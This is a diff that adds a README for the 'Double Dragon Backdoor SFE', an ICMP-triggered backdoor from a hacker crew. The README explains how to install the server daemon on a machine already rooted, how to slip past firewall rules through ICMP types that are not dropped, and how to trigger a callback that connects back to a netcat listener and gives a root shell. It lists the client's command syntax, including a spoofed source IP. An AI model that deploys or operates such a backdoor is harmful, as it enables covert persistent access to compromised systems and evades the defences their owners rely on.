@@ -1,0 +1,46 @@
+
+         Double Dragon Backdoor SFE (Special Firewall Edition)
+                by tHE rECIdjVO <recidjvo@pkcrew.org>
+
+                   Member of the Packet Knights Crew
+                        http://www.pkcrew.org/
+
+                        ---> README file
+
+
+[ GENERAL ]
+This is a special edition of the Double Dragon Backdoor, created specially for bypassing firewalled machines.
+
+The concept is simple: just get root on the remote machine and check if at least one of the ICMP types is not dropped by firewall rules.
+If this is ok, configure, compile and run as daemon ranzou-sfe.c.
+
+To reach the shell, use jimmy-sfe to send an ICMP message to ranzou-sfe with callback data, and wait for the server to connect and give you the prompt :)
+
+It's good for firewalls because they often drop only some kind of ICMP (like ICMP echo-request or echo-reply, but not others, so we can reach the server without problems. All the client needs is the netcat installed on the system (if you don't have nc, download it from the RedHat ftp).
+
+Cause jimmy-sfe and ranzou-sfe use raw socket for ICMP data, you must run them as root (or suid to root).
+
+- Why not to use ICMP tunneling for data too?
+- 'Cause it generates a weakness due to the big number of ICMP packets, and because you cannot have a real shell binded, but ony execute commands (many not fully workin')
+
+[ RANZOU SETUP ]
+Double Dragon Backdoor SFE provides you the possibility to reach a root or non-root shell on the remote system. This is because I coded it not only for attack purposes but also for a valid admin tool not so visible as the in.telnetd daemon :)
+Password is needed to complete the callback procedure, and gives you the user-privileges if USER is a valid entry in the /etc/passwd file, root otherwise.
+Define them before compiling in the #define section.
+
+[ JIMMY SETUP ]
+All you have to change in the pre-compiling time is the tipe of ICMP to send (0 -> echo-reply is the default).
+
+Jimmy syntax is simple:
+
+jimmy-sfe <ranzou_addr> <ranzou_pass> <jimmy_ip> <jimmy_port> <spoofed_ip>
+	ranzou_addr: server host
+	ranzou_pass: server passwd (defined in server include PASSWD)
+	jimmy_ip: client ip (your ip, if you don't need a 3 way connection)
+	jimmy_port: local port bind by netcat
+	spoofed_ip: spoofed ip for the packet
+
+Please turn on your brain before use this code.
+						tHE rECIdjVO
+
+Special thanks: |CyRaX| for the ICMP raw socket help
